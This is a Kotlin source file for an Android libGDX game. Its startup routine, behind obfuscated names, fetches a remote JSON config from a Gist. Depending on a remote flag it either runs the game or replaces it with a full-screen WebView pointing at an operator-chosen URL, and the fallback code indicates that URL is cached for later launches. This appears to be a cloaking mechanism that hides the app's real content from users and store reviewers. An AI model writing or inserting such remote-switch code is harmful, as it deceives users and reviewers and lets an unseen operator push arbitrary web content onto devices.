package com.skypro.doger.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.utils.ScreenUtils
import com.skypro.doger.MainActivity
import com.skypro.doger.appContext
import com.skypro.doger.game.manager.NavigationManager
import com.skypro.doger.game.screens.SplashScreen
import com.skypro.doger.game.utils.advanced.AdvancedGame
import com.skypro.doger.util.Gist
import com.skypro.doger.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

var GDX_GLOBAL_isGame = false
    private set

//var GDX_GLOBAL_isLoadAssets = false
var GDX_GLOBAL_isPauseGame  = false

var GDX_ORIGINAL_LINK = ""
    private set

lateinit var game: LibGDXGame private set

class LibGDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager: AssetManager private set

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("SretOip", MODE_PRIVATE)


    override fun create() {
        game         = this
        assetManager = AssetManager()

        NavigationManager.navigate(SplashScreen())

        maruff()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(Color.BLACK)
        super.render()
    }

    override fun dispose() {
        super.dispose()
        coroutine.cancel()
        assetManager.dispose()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun maruff() {
        log("panamerka")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val savedData = sharedPreferences.getString("grace", "paup") ?: "paup"

        try {
            if (savedData == "paup") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson(activity.getGistURL()) }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.flag == "true") GDX_GLOBAL_isGame = true
                        else {
                            GDX_ORIGINAL_LINK = getJSON.link
                            activity.webViewHelper.loadUrl(GDX_ORIGINAL_LINK)
                        }
                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                GDX_ORIGINAL_LINK = savedData
                activity.webViewHelper.loadUrl(savedData)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }

}